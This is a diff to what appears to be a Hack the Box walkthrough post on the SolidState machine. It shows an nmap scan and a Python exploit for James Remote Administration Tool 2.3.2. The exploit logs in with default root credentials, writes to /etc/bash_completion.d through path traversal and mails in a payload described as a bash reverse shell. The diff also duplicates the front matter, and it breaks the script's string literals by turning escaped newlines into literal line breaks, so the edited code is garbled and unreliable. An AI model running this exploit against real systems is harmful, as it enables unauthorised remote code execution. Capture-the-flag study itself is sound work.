@@ -1,3 +1,17 @@
+---
+title: SolidState - Hack the Box
+date: 2024-10-13 12:07:03 -0400
+categories: [Hack the Box]
+tags: [Walkthrough]
+image: /assets/SolidState.png
+---
+---
+title: 2024-10-12-SolidState - Hack the Box
+date: 2024-10-13 12:01:04 -0400
+categories: [Hack the Box]
+tags: [Walkthrough]
+image: /assets/2024-10-12-SolidState.png
+---
 #linux #manual 
 ### Scan
 ```
@@ -28,9 +42,15 @@ PORT     STATE SERVICE VERSION
 |_    Login id:
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port4555-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1BD82%P=aarch64-unknown-linux
-SF:-gnu%r(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\
-SF:.3\.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id
-SF::\nPassword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
+SF:-gnu%r(GenericLines,7C,"JAMES Remote Administration Tool 2\
+SF:.3\.2
+Please enter your login and password
+Login id
+SF::
+Password:
+Login failed for 
+Login id:
+");
 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -56,9 +76,12 @@ user = 'root'
 pwd = 'root'
  
 if len(sys.argv) != 4:
-    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>\n" % sys.argv[0])
-    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
-    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
+    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>
+" % sys.argv[0])
+    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443
+" % sys.argv[0])
+    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.
+")
     sys.exit(1)
  
 remote_ip = sys.argv[1]
@@ -85,36 +108,52 @@ try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
     s.recv(1024)
-    s.send((user + "\n").encode('utf-8'))
+    s.send((user + "
+").encode('utf-8'))
     s.recv(1024)
-    s.send((pwd + "\n").encode('utf-8'))
+    s.send((pwd + "
+").encode('utf-8'))
     s.recv(1024)
     print ("[+]Creating user...")
-    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
+    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit
+".encode('utf-8'))
     s.recv(1024)
-    s.send("quit\n".encode('utf-8'))
+    s.send("quit
+".encode('utf-8'))
     s.close()
  
     print ("[+]Connecting to James SMTP server...")
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
-    s.send("ehlo team@team.pl\r\n".encode('utf-8'))
+    s.send("ehlo team@team.pl
+".encode('utf-8'))
     recv(s)
     print ("[+]Sending payload...")
-    s.send("mail from: <'@team.pl>\r\n".encode('utf-8'))
+    s.send("mail from: <'@team.pl>
+".encode('utf-8'))
     recv(s)
-    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n".encode('utf-8')) if the recipient cannot be found
-    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n".encode('utf-8'))
+    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>
+".encode('utf-8')) if the recipient cannot be found
+    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>
+".encode('utf-8'))
     recv(s)
-    s.send("data\r\n".encode('utf-8'))
+    s.send("data
+".encode('utf-8'))
     recv(s)
-    s.send("From: team@team.pl\r\n".encode('utf-8'))
-    s.send("\r\n".encode('utf-8'))
-    s.send("'\n".encode('utf-8'))
-    s.send((payload + "\n").encode('utf-8'))
-    s.send("\r\n.\r\n".encode('utf-8'))
+    s.send("From: team@team.pl
+".encode('utf-8'))
+    s.send("
+".encode('utf-8'))
+    s.send("'
+".encode('utf-8'))
+    s.send((payload + "
+").encode('utf-8'))
+    s.send("
+.
+".encode('utf-8'))
     recv(s)
-    s.send("quit\r\n".encode('utf-8'))
+    s.send("quit
+".encode('utf-8'))
     recv(s)
     s.close()
     print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
